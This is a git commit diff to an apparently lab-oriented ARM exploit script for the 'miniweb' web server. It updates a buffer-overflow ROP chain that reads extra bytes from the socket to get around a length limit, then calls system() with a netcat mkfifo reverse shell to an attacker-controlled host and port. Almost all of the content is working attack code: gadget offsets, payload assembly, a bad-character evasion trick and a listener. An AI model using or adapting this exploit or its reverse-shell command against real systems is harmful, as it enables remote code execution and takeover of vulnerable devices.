ef8ababdae92ac4cf00f5bd33fad2d21c98841b6
Ethan Willoner <ethanwilloner@users.noreply.github.com>
2019-08-10 20:21:23 -0700

    Another miniweb/tinysploitARM ROP chain with a bypass for the previously encountered ROP chain length limit, utilizing read(sock_fd) to read an additional arbitrary number of bytes out of the socket.

--- tinysploitARM/miniweb_ret2sys_v2.py
+++ tinysploitARM/miniweb_ret2sys_v2.py
@@ -2,7 +2,6 @@
 
 from pwn import *
 import socket
-from ctypes import c_uint
 
 context.arch='arm'
 context.bits=32
@@ -20,10 +19,8 @@ BUFFER_OFFSET = 216
 
 # https://security.stackexchange.com/questions/53345/can-pipe-shell-nc-pipe-achieve-remote-shell
 # Tip to replace spaces with tabs from https://no-sec.net/writeup-dvar-rop-challenge/
-SHELL_CMD1 = 'rm -f /tmp/f;mkfifo /tmp/f'
-SHELL_CMD1 = SHELL_CMD1.replace(' ', '\t') + ';#'
-SHELL_CMD2 = 'cat /tmp/f|/bin/sh -i 2>&1|nc %s %i >/tmp/f' % (LHOST,LPORT)
-SHELL_CMD2 = SHELL_CMD2.replace(' ', '\t') + ';#'
+REVERSE_SHELL_CMD = 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %i >/tmp/f;#' % (LHOST,LPORT)
+REVERSE_SHELL_CMD = REVERSE_SHELL_CMD.replace(' ', '\t')
 
 # GET request requires / to be parsed correctly
 # Format of the string that overwrites lr from binary
@@ -50,16 +47,24 @@ def build_payload( SHELL_CMD ):
     Payload will execute a read call to grab extra data
     out of the socket to bypass shellcode length limitations.
     Rather than manually do a system call, just use a read gadget:
-    r0: file descriptor (seems to always be 4)
+    r0: file descriptor
     r1: void * buf (use mov r0, sp gadget to get stack pointer)
-    r2: size 
+    r2: size
+
+    r0 (fd) is always 4, because the web server does not create any
+    other file descriptors and the use of the fd that it uses for accept
+    is fully deterministic, so we can cheat on this and not have to create
+    a really complex chain for grabbing the fd from the previous stack frame.
+
+    The payload then uses a ROP chain to call system() with an
+    arbitrary command (in this case, a reverse shell) 
     '''
     payload = ''
     payload += 'Z'*(BUFFER_OFFSET-LOG_STR_LEN)
     # Payload entry point
-    payload += p32(LIBC_BASE + 0x00059ae7) # pop {r0, r4, pc};
+    payload += p32(LIBC_BASE + 0x0001c62c) # pop {pc};
     payload += 'A'*16 # Log() epilogue adds 16 to sp
-    payload += p32(LIBC_BASE + 0x00059857) # pop {r0, r2, pc};
+    payload += p32(LIBC_BASE + 0x00059856) # pop {r0, r2, pc};
     payload += p32(LIBC_BASE + 0x0002410f) # masked addr for mov r0, sp
     payload += p32(0xfffffff0) # mask for r2 for mov r0, sp
     payload += p32(LIBC_BASE + 0x00039c94) # and r0, r0, r2; and r1, r1, r3; pop {r4, r5, r6, r7, pc};
@@ -86,33 +91,29 @@ def build_payload( SHELL_CMD ):
     payload += p32(LIBC_BASE + 0x000455b0) # mov r2, r5; mov r0, r4; blx r3;
     payload += 'JJJJ' # Junk for r4
     payload += p32(LIBC_BASE + READ_ADDR) # call read(4, *sp, 4k)
-    # Move *sp back to r0 so we can jump to it, there's no usable bx sp gadget
-    payload += p32(LIBC_BASE + 0x0003fec0) # mov r0, r1; pop {r4, r5, r6, pc}; 
-    payload += 'KKKK' # Junk for r4
-    payload += 'LLLL' # Junk for r4
-    payload += 'MMMM' # Junk for r4
-    payload += p32(LIBC_BASE + 0x000435ac) # bx r0;
-    payload += cyclic(37) # 37 bytes worth of sp decrement to fill
-
-    # Rest of this is the system() rop chain from previous challenge
-    payload += p32(LIBC_BASE + 0x00059ae7) # pop {r0, r4, pc}; 
+    payload += p32(LIBC_BASE + 0x00050c08) # blx sp;
+    payload += cyclic(53)
+    payload += p32(LIBC_BASE + 0x00059857) # pop {r0, r2, pc};
+    payload += 'K'*24
+    payload += p32(LIBC_BASE + 0x0005a0f7) # pop {r0, r3, r4, pc};
     payload += p32(0x0fff0fff) # Add to overflow 
+    payload += 'LLLL' # Junk for r3
     # Address has bad character so add constant to computed address to overflow once in register
     payload += p32(0xf000f000 + SYSTEM_ADDR + 1)  
     payload += p32(LIBC_BASE + 0x0004b448) # add r0, r0, r4; pop {r4, pc};
-    payload += 'AAAA' # Junk for r4
+    payload += 'MMMM' # Junk for r4
     payload += p32(LIBC_BASE + 0x000390ff) # movs r3, r0; pop {r4, r6, r7, pc};
-    payload += 'BBBB' # Junk for r4
-    payload += 'CCCC' # Junk for r6
-    payload += 'DDDD' # Junk for r7
+    payload += 'NNNN' # Junk for r4
+    payload += 'OOOO' # Junk for r6
+    payload += 'PPPP' # Junk for r7 
     payload += p32(LIBC_BASE + 0x00059857) # pop {r0, r2, pc};
     payload += p32(LIBC_BASE + 0x0002410f) # masked addr for mov r0, sp
     payload += p32(0xfffffff0) # mask for r2 for mov r0, sp
     payload += p32(LIBC_BASE + 0x00039c94) # and r0, r0, r2; and r1, r1, r3; pop {r4, r5, r6, r7, pc};
-    payload += 'EEEE' # Junk for r4
+    payload += 'QQQQ' # Junk for r4 
     payload += p32(LIBC_BASE + 0x0005a447) # pop {r3, pc}; into r5 cleanup r6 off stack
-    payload += 'FFFF' # Junk for r6
-    payload += 'GGGG' # Junk for r7
+    payload += 'RRRR' # Junk for r6
+    payload += 'SSSS' # Junk for r7
     payload += p32(LIBC_BASE + 0x00059a87) # pop {r2, pc};
     payload += p32(LIBC_BASE + 0x00017b75) # pop {r0, r6, pc}; 
     payload += p32(LIBC_BASE + 0x00061a7f) # push {r0, r3, r5, r6}; bx r2; r6 cleanup by by earlier instruction in r5 
@@ -121,20 +122,17 @@ def build_payload( SHELL_CMD ):
     return payload
 
 def main():
-    # Build and send first payload
-    payload = build_payload(SHELL_CMD1 + '\t' + SHELL_CMD2)
-    print len(payload)
+
+    # This exploit seems to be 100% reliable :)
+    # Nothing has changed that hasn't already been document.
+    # Also note to self: restart your VM's once in a while, you spent
+    # 3 hours debugging a "flakey" ROP chain that worked on the first
+    # try with no modifications after a VM restart *head desk*
+
+    payload = build_payload(REVERSE_SHELL_CMD)
     has_bad_chars( payload )
 
-    sock = remote(HOST, PORT)
-    sock.send(GET_REQUEST.format(payload))
-    sock.close()
-
-    # Build and send second payload to get shell
-    payload = build_payload(SHELL_CMD2)
-    has_bad_chars( payload )
-
-    PWN_LISTENER = 0
+    PWN_LISTENER = 1
     if PWN_LISTENER:
         l = listen(LPORT)
 
